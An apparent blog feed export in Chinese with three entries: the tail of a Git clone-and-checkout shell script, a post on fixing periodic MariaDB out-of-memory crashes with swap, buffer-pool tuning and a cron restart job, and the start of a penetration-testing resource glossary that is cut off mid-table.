-v<span class="token punctuation">)</span> GITTAG<span class="token operator">=</span><span class="token string">"<span class="token variable">$2</span>"</span>        <span class="token function">shift</span> <span class="token punctuation">;</span><span class="token punctuation">;</span>    -t<span class="token punctuation">)</span> TARGET<span class="token operator">=</span><span class="token string">"<span class="token variable">$2</span>"</span>        <span class="token function">shift</span> <span class="token punctuation">;</span><span class="token punctuation">;</span>  esac  <span class="token function">shift</span><span class="token keyword">done</span><span class="token comment" spellcheck="true"># 标记目标路径 ${TARGET} 是否已存在 Git Repository</span><span class="token function">export</span> EXIST_GITLAB<span class="token operator">=</span><span class="token string">"F"</span><span class="token comment" spellcheck="true"># 判断存储路径是否存在 ".." , 避免入参路径穿越</span><span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable">${TARGET}</span> <span class="token operator">=</span>~ <span class="token string">".."</span> <span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> <span class="token string">"Error: target path '<span class="token variable">${TARGET}</span>' exists path crossing risk (Please remove all '..' !!!)"</span>  <span class="token keyword">exit</span> 1<span class="token keyword">fi</span><span class="token comment" spellcheck="true"># 禁止直接使用一、二级目录(如 /, /tmp, /home 等)，必须至少是三级目录</span><span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable">${TARGET}</span> <span class="token operator">=</span>~ ^/<span class="token punctuation">[</span>a-zA-Z0-9<span class="token punctuation">]</span>*$ <span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> <span class="token string">"Error: target path '<span class="token variable">${TARGET}</span>' must be a three-level directory at least, eg: /tmp/repository"</span>  <span class="token keyword">exit</span> 1<span class="token keyword">fi</span><span class="token comment" spellcheck="true"># 要求存储项目的目录为空目录, 确保把相关操作控制在该目录内</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token operator">!</span> -d <span class="token variable">${TARGET}</span> <span class="token punctuation">]</span> <span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">:</span> <span class="token comment" spellcheck="true"># 目录不存在</span><span class="token keyword">elif</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable"><span class="token variable">`</span><span class="token function">ls</span> -A $<span class="token punctuation">{</span>TARGET<span class="token punctuation">}</span><span class="token variable">`</span></span>"</span> <span class="token operator">=</span> <span class="token string">""</span> <span class="token punctuation">]</span> <span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">:</span> <span class="token comment" spellcheck="true"># 目录存在但是为空</span><span class="token keyword">else</span>  <span class="token comment" spellcheck="true"># 检查目标目录是否已存在仓库</span>  <span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token punctuation">$(</span>cat <span class="token variable">${TARGET}</span>/.git/config <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">'url'</span><span class="token punctuation">)</span> <span class="token operator">=</span>~ <span class="token variable">${DOMAIN}</span> <span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">;</span> <span class="token keyword">then</span>    EXIST_GITLAB<span class="token operator">=</span><span class="token string">"T"</span>  <span class="token keyword">else</span>    <span class="token keyword">echo</span> <span class="token string">"Error: target path '<span class="token variable">${TARGET}</span>' already exists and is not an empty directory."</span>    <span class="token keyword">exit</span> 1  <span class="token keyword">fi</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true"># 删除 url 地址开头的 http 标识</span><span class="token function">export</span> GITURI<span class="token operator">=</span>$<span class="token punctuation">{</span>GITURL<span class="token comment" spellcheck="true">#https://}</span>GITURI<span class="token operator">=</span>$<span class="token punctuation">{</span>GITURI<span class="token comment" spellcheck="true">#http://}</span><span class="token comment" spellcheck="true"># 把 username 和 password 里面的 @ 字符编码为 %40</span>GITUSER<span class="token operator">=</span><span class="token variable">${GITUSER//@/%40}</span>GITPASS<span class="token operator">=</span><span class="token variable">${GITPASS//@/%40}</span><span class="token keyword">echo</span> <span class="token string">"---------- Input Params ----------"</span><span class="token keyword">echo</span> <span class="token string">"Git Repository URL = <span class="token variable">${GITURL}</span>"</span><span class="token keyword">echo</span> <span class="token string">"Git Repository Branch = <span class="token variable">${GITBRANCH}</span>"</span><span class="token keyword">echo</span> <span class="token string">"Git Repository User = <span class="token variable">${GITUSER}</span>"</span><span class="token comment" spellcheck="true"># echo "Git Repository Pass = ${GITPASS}"</span><span class="token keyword">echo</span> <span class="token string">"Git Repository Pass = ********"</span><span class="token keyword">echo</span> <span class="token string">"Git Repository Tag Version = <span class="token variable">${GITTAG}</span>"</span><span class="token keyword">echo</span> <span class="token string">"Save Directory = <span class="token variable">${TARGET}</span>"</span><span class="token keyword">echo</span> <span class="token string">"----------------------------------"</span><span class="token comment" spellcheck="true"># 从 Git 仓库拉取项目</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">${EXIST_GITLAB}</span> <span class="token operator">=</span> <span class="token string">"F"</span> <span class="token punctuation">]</span> <span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> <span class="token string">"Pulling Git Repository from <span class="token variable">${GITURL}</span> ..."</span>  <span class="token function">git</span> clone https://<span class="token variable">${GITUSER}</span><span class="token keyword">:</span><span class="token variable">${GITPASS}</span>@<span class="token variable">${GITURI}</span> <span class="token variable">${TARGET}</span>  <span class="token keyword">if</span> <span class="token punctuation">[</span> -d <span class="token variable">${TARGET}</span> <span class="token punctuation">]</span> <span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token keyword">echo</span> <span class="token string">"Git Repository has been saved to : <span class="token variable">${TARGET}</span>"</span>  <span class="token keyword">else</span>    <span class="token keyword">echo</span> <span class="token string">"Error: Pull Git Repository Failed."</span>    <span class="token keyword">exit</span> 1  <span class="token keyword">fi</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true"># 更新 master 最新的代码以及 branch 、 tag 等信息</span><span class="token keyword">echo</span> <span class="token string">"Update Git Repository ..."</span><span class="token function">cd</span> <span class="token variable">${TARGET}</span><span class="token function">git</span> checkout master<span class="token function">git</span> pull<span class="token comment" spellcheck="true"># 切换 branch</span><span class="token comment" spellcheck="true"># git checkout &lt;branch></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">${GITTAG}</span>"</span> <span class="token operator">=</span> <span class="token string">"latest"</span> <span class="token punctuation">]</span> <span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> <span class="token string">"Switch to branch <span class="token variable">${GITBRANCH}</span> ..."</span>  branch<span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">git</span> branch -a <span class="token operator">|</span> <span class="token function">grep</span> $<span class="token punctuation">{</span>GITBRANCH<span class="token punctuation">}</span><span class="token variable">)</span></span>  <span class="token keyword">echo</span> <span class="token string">"<span class="token variable">${branch}</span>"</span>  <span class="token keyword">if</span> <span class="token punctuation">[</span> -n <span class="token string">"<span class="token variable">${branch}</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token function">git</span> checkout <span class="token variable">${GITBRANCH}</span> <span class="token comment" spellcheck="true"># 切换分支</span>    <span class="token function">git</span> pull        <span class="token comment" spellcheck="true"># 更新到分支的最新版本</span>  <span class="token keyword">else</span>    <span class="token keyword">echo</span> <span class="token string">"Error: branch '<span class="token variable">${GITBRANCH}</span>' is not exists."</span>    <span class="token keyword">exit</span> 1  <span class="token keyword">fi</span><span class="token comment" spellcheck="true"># 切换 tag (注意 tag 是基线，不需要也不能通过 pull 更新代码)</span><span class="token comment" spellcheck="true"># git checkout -b &lt;local_branch> &lt;tag></span><span class="token keyword">else</span>  <span class="token keyword">echo</span> <span class="token string">"Switch to tag <span class="token variable">${GITTAG}</span> ..."</span>  tag<span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">git</span> tag <span class="token operator">|</span> <span class="token function">grep</span> $<span class="token punctuation">{</span>GITTAG<span class="token punctuation">}</span><span class="token variable">)</span></span>  branch<span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">git</span> branch -a <span class="token operator">|</span> <span class="token function">grep</span> $<span class="token punctuation">{</span>GITTAG<span class="token punctuation">}</span><span class="token variable">)</span></span>  <span class="token comment" spellcheck="true"># 若 tag 存在</span>  <span class="token keyword">if</span> <span class="token punctuation">[</span> -n <span class="token string">"<span class="token variable">${tag}</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token comment" spellcheck="true"># 若未创建该 tag 对应的本地分支，则创建并切换到该分支</span>    <span class="token keyword">if</span> <span class="token punctuation">[</span> -z <span class="token string">"<span class="token variable">${branch}</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>      <span class="token function">git</span> checkout -b <span class="token variable">${GITTAG}</span> <span class="token variable">${GITTAG}</span>    <span class="token comment" spellcheck="true"># 若已创建该 tag 对应的本地分支，则直接切换到该分支</span>    <span class="token keyword">else</span>      <span class="token function">git</span> checkout <span class="token variable">${GITTAG}</span>    <span class="token keyword">fi</span>  <span class="token keyword">else</span>    <span class="token keyword">echo</span> <span class="token string">"Error: tag '<span class="token variable">${GITTAG}</span>' is not exists."</span>    <span class="token keyword">exit</span> 1  <span class="token keyword">fi</span><span class="token keyword">fi</span><span class="token keyword">echo</span> <span class="token string">"Finish: Git Repository has been updated to : <span class="token variable">${TARGET}</span>"</span><span class="token keyword">exit</span> 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 开发/语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shell </tag>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mariadb 周期性崩溃问题处理：Error establishing a database connection</title>
      <link href="/website/mariadb-zhou-qi-xing-beng-kui-chu-li-ji-lu/"/>
      <url>/website/mariadb-zhou-qi-xing-beng-kui-chu-li-ji-lu/</url>
      
        <content type="html"><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><ul><li>建站环境：Centos7 + LAMP + WordPress</li><li>物理内存：2G</li><li>相关插件：Redis Object Cache （Redis缓存加速）</li><li>数据库：Mariadb + Redis （均使用默认数据库配置）</li><li>异常现象：几乎<strong>很规律地每周一次</strong>打开站点时提示<code>Error establishing a database connection</code></li><li>临时恢复手段：重启 Marridb 进程</li></ul><h2 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h2><p>刚开始以为是偶发的，就没在意，但是数个月来都是每周一次，就实在是折腾人了。</p><p>最初分析以为是 Redis Object Cache 插件导致的（怀疑是Redis缓存数据过期引起的雪崩），但是关掉Redis Object Cache 之后依旧是每周一次，那就<strong>肯定是Mariadb自身的问题</strong>了。</p><p>而且这个问题有几个很有意思的关键点：</p><ul><li>很有规律地每周一次（当然是基于我的环境而言，不同的环境触发时机可能不同）</li><li>Mariadb数据库未做过任何配置优化（纯粹使用默认配置）</li><li>每次都可以通过重启Mariadb进程恢复</li></ul><p>不难联想到是内存导致的（事后也证实了是这个原因），而重启Mariadb进程可以解决是因为做了内存的释放与再分配。</p><h2 id="原因定位"><a href="#原因定位" class="headerlink" title="原因定位"></a>原因定位</h2><p>首先去核查Mariadb数据库的异常日志，确认数据库崩溃的时候都发生了些什么。</p><p>如果不知道异常日志的位置，可以通过输入以下命令，利用Mariadb的进程信息找到它：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ps</span> -ef<span class="token operator">|</span><span class="token function">grep</span> mariadb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>若Mariadb正在运行，会返回类似于以下的信息：</p><blockquote><p>mysql    31877 31532  0 16:07 ?        00:00:04<br>/usr/libexec/mysqld –basedir=/usr –datadir=/var/lib/mysql –plugin-dir=/usr/lib64/mysql/plugin <font color="red">–log-error=/var/log/mariadb/mariadb.log</font> –pid-file=/var/run/mariadb/mariadb.pid –socket=/var/lib/mysql/mysql.sock –port=3306</p></blockquote><p>其中log-error就是异常日志的位置，这里为：</p><blockquote><p>/var/log/mariadb/mariadb.log</p></blockquote><p>通过<code>tail /var/log/mariadb/mariadb.log</code>命令可查看最近发生的异常。</p><p>具体的日志我就不全部贴出来了，这里只拷贝日志中一些与当下要解决的问题相关的部分：</p><blockquote><p><strong># Mariadb崩溃前打印的异常</strong><br>180906  0:51:40 InnoDB: Fatal error: <font color="red">cannot allocate <strong>memory</strong> for the buffer pool</font><br>180807 19:30:09 [ERROR] mysqld: <font color="red">Out of <strong>memory</strong></font> (Needed 128917504 bytes)<br>180908 13:56:25 InnoDB: <font color="red">The InnoDB <strong>memory</strong> heap is disabled</font><br>**# Mariadb重启后打印的信息**<br>180910  8:04:41 InnoDB: Initializing <font color="blue">buffer pool, size = 128.0M</font><br>180910  8:04:41 InnoDB: Completed initialization of buffer pool</p></blockquote><p>前三行就是导致<code>Error establishing a database connection</code>异常的罪魁祸首，在一次数据库崩溃的时候不一定都会出现，但他们所描述的大概意思都是差不多的：由于机器内存不足，无法分配给InnoDB缓冲池足够的内存，导致InnoDB无法启用。</p><p>后两行是Mariadb重启后打印的，意思是：成功分配给InnoDB缓冲池128M内存（<strong>具体分配多少内存是视Mariadb的实际配置而定的</strong>）。</p><p>需知道Mariadb本质上就是Mysql的分支，因此也具备了InnoDB和MyISAM两种存储引擎。而InnoDB的缓存机制与MyISAM的最大区别就在于，InnoDB不仅仅缓存索引，还会缓存实际的数据。所以<strong>使用InnoDB的前提是要有足够大的物理内存</strong>。</p><blockquote><p>在Mariadb的服务配置文件中有一个innodb_buffer_pool_size 参数，它用来设置InnoDB缓存用户表及索引数据的最主要缓存空间，对InnoDB整体性能影响也最大。</p></blockquote><p>其实前面说了这么多，<font color="red"><strong>总结下来就是</strong></font>：</p><p>Mariadb没有配置好InnoDB，WordPress本身就比较占资源，站点访问量稍微大一些，之前已分配给InnoDB的内存就满了。机器内存由于还提供了其他应用服务，剩余内存不够InnoDB重分配，而<strong>机器本身又没有针对垃圾内存的释放策略</strong>，于是Mariadb进程就锁死了。最终WordPress由于无法连接到数据库，在站点页面打印了异常<code>Error establishing a database connection</code>。</p><h2 id="问题处理"><a href="#问题处理" class="headerlink" title="问题处理"></a>问题处理</h2><p>其实这个问题多发于内存低配的服务器上，内存高配服务器并不明显。</p><p>但无论低配还是高配服务器，都需要具备一套针对内存不足时的处理策略。现在既然知道到了问题的根本原因，就能定制出对应的处理方案：</p><ul><li><strong>减少InnoDB需求的内存</strong>：这是直观上处理手段，但是指标不治本，只是问题的触发周期延长了而已。</li><li><strong>优化服务器的内存处理策略</strong>：推荐建立合理的交换分区swap（类似于虚拟内存技术），可从根本上解决问题。</li><li><strong>建立Mariadb进程的守护进程</strong>：这是备用的补救措施，如可通过crontab命令检测Mariadb进程状态，发生异常时即时重启。</li></ul><h2 id="创建交换分区swap"><a href="#创建交换分区swap" class="headerlink" title="创建交换分区swap"></a>创建交换分区swap</h2><p>swap（即交换分区）是在Linux上较为推崇的、类似于Windows的虚拟内存技术。具备swap的Linux，当遇到物理内存不足的情况，就可以把部分硬盘空间当成虚拟内存使用，从而解决了物理内存不足的问题。</p><p>Linux把物理内存划分为多个内存段，称为页面。而交换就是指内存页面被复制到预先设定好的硬盘空间（即交换空间）的过程，目的是释放掉页面的内存，供其他应用使用。物理内存和交换空间的总大小是可用的虚拟内存的总量。</p><p>下面描述如何在Centos上创建交换分区。</p><p>首先需要使用<code>root用户</code>登陆系统。</p><p>通过<code>free -mh</code>命令查看内存和swap的分配情况，<strong>默认Centos是没有设置swap的，因此swap分区的大小是0</strong>：</p><blockquote><p>　　　　total　　used　　　free　　shared　buff/cache　available<br>Mem: 　　　1.8G　　662M　　210M　　560K　　　965M　　　1.0G<br><font color="red">Swap:　　　　0　　　　0　　　　0</font></p></blockquote><p>当然也可以通过<code>swapon -s</code>命令查看已经配置的swap空间（但若无配置swap空间则此命令无任何反应）。</p><p>按照习惯，<strong>建议swap交换分区的大小为实际物理内存的2~2.5倍</strong>。在本例中的物理内存是2G，因此这里创建4G的交换分区。</p><p>此前先通过<code>df -h</code>命令查看硬盘是否有大于4G的可用空间（本例中可见剩余36G，足够了）：</p><blockquote><p>Filesystem　　Size　Used　Avail　Use%　Mounted on<br>　/dev/vda1　　　50G　　12G　<font color="red">36G</font>　25%　　　/<br>　devtmpfs　　　909M    　 0　　909M　0%　　　/dev<br>　tmpfs　　　　　920M　24K　920M　1%　　　/dev/shm<br>　tmpfs　　　　　920M　460K　919M　1%　　/run<br>　tmpfs　　　　　920M　　0　　920M　0%　　/sys/fs/cgroup<br>　tmpfs　　　　　184M　　0　　184M　0%　　/run/user/0</p></blockquote><p>使用<code>dd</code>命令创建swap交换分区文件<code>/home/swap</code>，大小为4G（由于较大，可能耗时较久）：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">dd</span> if<span class="token operator">=</span>/dev/zero of<span class="token operator">=</span>/home/swap bs<span class="token operator">=</span>1024 count<span class="token operator">=</span>4096000<span class="token comment" spellcheck="true"># 命令参数解析</span><span class="token comment" spellcheck="true"># if=&lt;文件>：代表输入文件，默认从stdin中读取输入。/dev/zero 是一个字符设备，会不断返回0值字节（\0）</span><span class="token comment" spellcheck="true"># of=&lt;文件>：代表输出文件，默认以stdout作为输出</span><span class="token comment" spellcheck="true"># bs=&lt;单个块的字节数>：交换分区的读写是以block（块）为单位的，每个block的大小默认为1K，即1024字节</span><span class="token comment" spellcheck="true"># count=&lt;块数>：交换分区文件的block数，count*bs就是交换分区的大小</span><span class="token comment" spellcheck="true"># 若创建成功则返回：</span><span class="token comment" spellcheck="true"># 4096000+0 records in</span><span class="token comment" spellcheck="true"># 4096000+0 records out</span><span class="token comment" spellcheck="true"># 4194304000 bytes (4.2 GB) copied, 40.4638 s, 104 MB/s</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这个<strong>交换分区文件</strong>上创建<strong>交换分区</strong>：</p><pre class="line-numbers language-bash"><code class="language-bash">mkswap /home/swap<span class="token comment" spellcheck="true"># 若创建成功则返回：</span><span class="token comment" spellcheck="true"># Setting up swapspace version 1, size = 4095996 KiB</span><span class="token comment" spellcheck="true"># no label, UUID=ec9e00e2-3d82-4bc0-bc99-e2e4837dcca5</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>激活交换分区：</p><pre class="line-numbers language-bash"><code class="language-bash">swapon /home/swap<span class="token comment" spellcheck="true"># 若激活成功则返回：</span><span class="token comment" spellcheck="true"># swapon: /home/swap: insecure permissions 0644, 0600 suggested.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>再次通过<code>free -mh</code>命令查看内存和swap的分配情况：</p><blockquote><p>　　　　total　　used　　　free　　shared　buff/cache　available<br>Mem: 　　　1.8G　　662M　　210M　　560K　　　965M　　　1.0G<br><font color="red">Swap:　　　3.9G　　　　0B　　　3.9G</font></p></blockquote><p>或通过<code>swapon -s</code>命令查看本机已配置的swap空间：</p><blockquote><p>Filename　　　Type　　　　Size　Used　Priority<br>/home/swap　　　　file　　4095996　　0　　　-1</p></blockquote><p>为了避免系统重启后交换分区失效，需要<strong>设置交换分区在开机后自动挂载</strong>。</p><p>由于系统开机时会主动读取<code>/etc/fstab</code>文件里的配置进行磁盘挂载，这样只需要将交换分区的挂载信息写入这个文件中就可以了。</p><p>通过命令<code>vi /etc/fstab</code>编辑文件，在末尾增加下面一行并保存即可：</p><pre class="line-numbers language-bash"><code class="language-bash">/home/swap           swap                 swap       defaults              0 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><font color="red">至此交换分区创建完成。</font></p><h2 id="附1：减少InnoDB的需求缓存"><a href="#附1：减少InnoDB的需求缓存" class="headerlink" title="附1：减少InnoDB的需求缓存"></a>附1：减少InnoDB的需求缓存</h2><p>一般来说，设置了交换分区就已经解决了这个问题了。但这里还是附上裁减InnoDB缓存的设置方法，针对一些内存极少的机器还是需要的。</p><p>首先登陆到Mariadb数据库<code>mysql -u root -p</code>，通过SQL查看当前InnoDB缓存是多大（若未修改过任何配置，默认情况下应该是128M）：</p><pre class="line-numbers language-sql"><code class="language-sql"> <span class="token keyword">SELECT</span> @<span class="token variable">@innodb_buffer_pool_size</span><span class="token operator">/</span><span class="token number">1024</span><span class="token operator">/</span><span class="token number">1024</span><span class="token punctuation">;</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">|</span> @<span class="token variable">@innodb_buffer_pool_size</span><span class="token operator">/</span><span class="token number">1024</span><span class="token operator">/</span><span class="token number">1024</span> <span class="token operator">|</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">|</span>                        <span class="token number">128.00000000</span> <span class="token operator">|</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>若要变更，只需在Mariadb配置文件修改·innodb_buffer_pool_size·参数大小即可。</p><p>默认情况下，Centos的Mariadb配置文件位置为：</p><blockquote><p>/etc/my.cnf</p></blockquote><p>但是官方并不推荐修改这个配置文件，因为当Mariadb升级时很可能会将其覆盖掉。不过这个配置文件会包含了一个配置目录<code>/etc/my.cnf.d</code>，其下的全部配置文件都会被包含进来。默认情况下，目录<code>/etc/my.cnf.d</code>内有三个配置文件：</p><blockquote><p>/etc/my.cnf.d/client.cnf<br>/etc/my.cnf.d/mysql-clients.cnf<br>/etc/my.cnf.d/server.cnf</p></blockquote><p>一般情况下，我们只需修改<code>/etc/my.cnf.d/server.cnf</code>配置文件即可。但是也可以在<code>/etc/my.cnf.d</code>目录下创建新的配置文件（它将被<code>/etc/my.cnf</code>自动包含）。</p><p>在本例中我们选择后者，即在<code>/etc/my.cnf.d</code>目录下创建新的配置文件。</p><p>打开<code>/usr/share/mysql</code>目录，可以发现这里有一些现成的mysql数据库样例配置文件，对应不同的使用场景：</p><blockquote><p>my-huge.cnf<br>my-innodb-heavy-4G.cnf<br>my-large.cnf<br>my-medium.cnf<br>my-small.cnf</p></blockquote><p>这里把<code>my-medium.cnf</code>拷贝过来：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cp</span> /usr/share/mysql/my-medium.cnf /etc/my.cnf.d/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过命令<code>vi /etc/my.cnf.d/my-medium.cnf</code>编辑配置文件，找到<code>innodb_buffer_pool_size</code>参数，去掉前面的#注释并修改成期望的大小即可（本文改成了32M）。</p><p>修改完成后，需重启Mariadb服务使其生效：</p><pre class="line-numbers language-bash"><code class="language-bash">systemctl restart mariadb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="附2：利用crontab守护Mariadb"><a href="#附2：利用crontab守护Mariadb" class="headerlink" title="附2：利用crontab守护Mariadb"></a>附2：利用crontab守护Mariadb</h2><p>作为备用方案，可利用crontab实时监控Mariadb的进程状态，万一崩溃则自动重启Mariadb进程，这样在最坏的情况下也能保证站点的正常使用了。</p><p>crontab是Centos内置的定时计划服务，可以用以下命令启动和停止服务：</p><pre class="line-numbers language-bash"><code class="language-bash">systemctl start crond.service   <span class="token comment" spellcheck="true"># 启动crontab服务</span>systemctl stop crond.service    <span class="token comment" spellcheck="true"># 停止crontab服务</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>使用<code>crontab -e</code>命令在crontab添加一行计划任务（拷贝下面的命令到末尾保存即可）：<font color="red">每分钟对Mariadb进程进行检查，若进程不存在则重新启动数据库服务</font>：</p><pre class="line-numbers language-bash"><code class="language-bash">*/1 * * * * <span class="token keyword">if</span> <span class="token punctuation">[</span> -z `ps -ef<span class="token operator">|</span><span class="token function">grep</span> mariadb<span class="token operator">|</span><span class="token function">grep</span> -v <span class="token function">grep</span><span class="token operator">|</span><span class="token function">awk</span> <span class="token string">'{print <span class="token variable">$2</span>}'</span>` <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">then</span> systemctl start mariadb<span class="token punctuation">;</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true"># 此计划任务解释：</span><span class="token comment" spellcheck="true"># */1 * * * *： 是cron表达式，这里表示每分钟执行一次。cron的语法可自行谷歌或百度</span><span class="token comment" spellcheck="true"># ps -ef：表示查看当前运行中的进程列表</span><span class="token comment" spellcheck="true"># grep mariadb：表示仅保留包含mariadb关键字的进程</span><span class="token comment" spellcheck="true"># grep -v grep：表示排除包含grep关键字的进程</span><span class="token comment" spellcheck="true"># awk '{print $2}'：表示提取进程号</span><span class="token comment" spellcheck="true"># -z：表示判断进程号是否为空</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重载或重启crontab使配置生效：</p><pre class="line-numbers language-bash"><code class="language-bash">systemctl reload crond.service   <span class="token comment" spellcheck="true"># 重载crontab配置</span>systemctl restart crond.service   <span class="token comment" spellcheck="true"># 重启crontab服务</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>通过<code>crontab -l</code>命令可确认当前用户的计划任务列表。</p><p>需注意crontab默认不会开机自启，可编辑<code>vi /etc/rc.d/rc.local</code>文件，在末尾添加以下内容并保存即可：</p><blockquote><p>systemctl start crond.service</p></blockquote><h2 id="资源下载"><a href="#资源下载" class="headerlink" title="资源下载"></a>资源下载</h2><blockquote><p><a href="http://download.csdn.net/download/lyy289065406/10657460">本文全文下载</a></p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网站建设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WordPress </tag>
            
            <tag> Mariadb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>白帽子渗透测试入门资源：参考书、课程、工具、认证</title>
      <link href="/safe/bai-mao-zi-shen-tou-ce-shi-ru-men-zi-yuan/"/>
      <url>/safe/bai-mao-zi-shen-tou-ce-shi-ru-men-zi-yuan/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>初入渗透测试领域，过程中遇到不少错综复杂的知识，也遇到不少坑，特此记录，慢慢整理慢慢填。</p><h2 id="名词解析"><a href="#名词解析" class="headerlink" title="名词解析"></a>名词解析</h2><table><thead><tr><th align="center">名词</th><th align="center">全称</th><th align="center">解析</th></tr></thead><tbody><tr><td align="center"><a href="https://www.offensive-security.com/information-security-training/penetration-testing-training-kali-linux/">PwK</a></td><td align="center">Penetration Testing with Kali Linux</td><td align="center">Kali-Linux 渗透测试培训课程</td></tr><tr><td align="center"><a href="https://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/?utm_expid=.TeGY58QMT8CDoyMIsdzldg.0&amp;utm_referrer=https://xz.aliyun.com/t/1587/">OSCP</a></td><td align="center">Offensive Security Certified Professional</td><td align="center">攻防安全专家认证</td></tr><tr><td align="center"><a href="https://www.owasp.org/">OWASP</a></td><td align="center">Open Web Application Security Project</td><td align="center">开放式Web应用程序安全项目<br>它提供有关计算机和互联网应用程序的公正、实际、<br>有成本效益的信息，如<a 